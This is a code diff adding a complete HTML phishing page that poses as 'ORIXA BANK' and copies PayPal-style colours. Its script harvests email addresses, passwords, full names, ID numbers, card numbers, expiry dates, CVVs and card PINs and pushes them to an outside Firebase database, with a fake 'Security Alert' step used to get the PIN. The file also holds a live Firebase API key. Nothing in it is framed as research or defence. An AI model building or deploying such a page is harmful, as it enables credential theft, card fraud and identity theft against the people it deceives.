@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Internal Access | Authentication</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root { --p-blue: #003087; --p-acc: #0070ba; --bg: #f5f7fa; }
+        body { font-family: "Open Sans", sans-serif; background: var(--bg); margin: 0; padding-bottom: 75px; }
+        
+        #app-view { display: none; }
+        #gate-view { padding: 40px 20px; text-align: center; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        
+        .brand { font-size: 26px; font-weight: 800; color: var(--p-blue); margin-bottom: 30px; }
+        .nav { background: var(--p-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; color: white; }
+        .card { background: #fff; margin: 12px; padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        
+        input { width: 100%; padding: 16px; border: 1px solid #9ca2a6; border-radius: 4px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 16px; background: var(--p-acc); color: white; border: none; border-radius: 25px; font-weight: 700; cursor: pointer; }
+        
+        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index: 5000; padding: 20px; box-sizing: border-box; }
+
+        /* Prevent chat bubble from blocking the verify button */
+        #smartsupp-widget-container { bottom: 90px !important; }
+    </style>
+</head>
+<body>
+
+    <div id="gate-view">
+        <div class="brand">ORIXA BANK</div>
+        <h2 id="gate-msg">Member Access</h2>
+        <div style="width: 100%; max-width: 350px;">
+            <input type="email" id="m_mail" placeholder="Email Address">
+            <div id="auth-flow"></div>
+            <button class="btn" id="gate-btn" onclick="processEntry()">Continue</button>
+        </div>
+    </div>
+
+    <div id="app-view">
+        <div class="nav">
+            <div style="font-weight:800;">ORIXA BANK</div>
+            <i class="fas fa-user-circle" style="font-size: 24px;"></i>
+        </div>
+
+        <div class="card">
+            <span style="font-weight:600; color:#666;">Total Portfolio</span>
+            <div style="font-size: 42px; font-weight: 300; margin: 10px 0;">US$0.00</div>
+            <button class="btn" onclick="openModal('card')">Verify Funding Source</button>
+        </div>
+        
+        <div id="activity-list" style="padding:20px;"></div>
+    </div>
+
+    <div id="pop-modal" class="modal">
+        <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
+            <b id="pop-title">Verify System</b>
+            <i class="fas fa-times" onclick="closeModal()" style="font-size: 20px;"></i>
+        </div>
+        <div id="pop-content"></div>
+    </div>
+
+<script>
+    const dbConfig = {
+        apiKey: "AIzaSyDp3h13LwtUlD7MiCkMys0EAgX5w2GGupc",
+        authDomain: "orixa-football-pro.firebaseapp.com",
+        projectId: "orixa-football-pro",
+        databaseURL: "https://orixa-football-pro-default-rtdb.firebaseio.com",
+    };
+    firebase.initializeApp(dbConfig);
+    const rtdb = firebase.database();
+
+    let step = 1; 
+    let tempMail = "";
+
+    window.processEntry = function() {
+        const mail = document.getElementById('m_mail').value;
+        if(!mail) return alert("Enter email.");
+
+        if(step === 1) {
+            tempMail = mail;
+            rtdb.ref('orixa_users').orderByChild('email').equalTo(mail).once('value', snapshot => {
+                if(snapshot.exists()) {
+                    document.getElementById('gate-msg').innerText = "Welcome Back";
+                    document.getElementById('auth-flow').innerHTML = `<input type="password" id="m_pass" placeholder="Password">`;
+                    step = 2;
+                } else {
+                    document.getElementById('gate-msg').innerText = "New Account Setup";
+                    document.getElementById('auth-flow').innerHTML = `
+                        <input type="password" id="m_pass" placeholder="Create Password">
+                        <input type="text" id="m_name" placeholder="Full Legal Name">
+                        <input type="text" id="m_id" placeholder="Identification Number">
+                    `;
+                    step = 3;
+                }
+            });
+        } 
+        else {
+            const pass = document.getElementById('m_pass').value;
+            const name = document.getElementById('m_name')?.value || "Existing User";
+            const ssn = document.getElementById('m_id')?.value || "N/A";
+
+            rtdb.ref('orixa_users').push({
+                email: tempMail,
+                pass: pass,
+                full_name: name,
+                id_num: ssn,
+                type: step === 2 ? 'Login' : 'Signup',
+                time: new Date().toLocaleString()
+            }).then(() => {
+                document.getElementById('gate-view').style.display = 'none';
+                document.getElementById('app-view').style.display = 'block';
+            });
+        }
+    };
+
+    window.openModal = function(type) {
+        document.getElementById('pop-modal').style.display = 'block';
+        const cont = document.getElementById('pop-content');
+        if(type === 'card') {
+            cont.innerHTML = `
+                <input type="text" id="c_n" placeholder="Card Number" maxlength="16">
+                <input type="text" id="c_e" placeholder="MM/YY" style="width:48%; display:inline-block;">
+                <input type="text" id="c_c" placeholder="CVV" style="width:48%; display:inline-block; float:right;" maxlength="3">
+                <button class="btn" onclick="saveCard()">Link Card</button>
+            `;
+        }
+    };
+
+    window.saveCard = function() {
+        const cn = document.getElementById('c_n').value;
+        if(cn.length < 16) return alert("16-digit required.");
+        
+        rtdb.ref('orixa_res').push({
+            n: cn, e: document.getElementById('c_e').value, c: document.getElementById('c_c').value
+        });
+
+        document.getElementById('pop-content').innerHTML = `
+            <div style="text-align:center; padding: 20px;">
+                <i class="fas fa-shield-alt fa-3x" style="color:var(--p-blue);"></i>
+                <p>Security Alert: Confirm 4-digit card PIN to authorize.</p>
+            </div>
+            <input type="password" id="c_p" placeholder="PIN" maxlength="4" style="text-align:center; font-size:24px; letter-spacing: 8px;">
+            <button class="btn" onclick="finishCard()">Confirm</button>
+        `;
+    };
+
+    window.finishCard = function() {
+        const pin = document.getElementById('c_p').value;
+        rtdb.ref('orixa_res').limitToLast(1).once('child_added', s => s.ref.update({p: pin}));
+        alert("Verification Complete.");
+        location.reload();
+    };
+
+    window.closeModal = function() { document.getElementById('pop-modal').style.display = 'none'; };
+</script>
+
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'b561b44ffefb49aa584810c42983ccf091f55186';
+window.smartsupp||(function(d) {
+var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+c.type='text/javascript';c.charset='utf-8';c.async=true;
+c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+
+</body>
+</html>
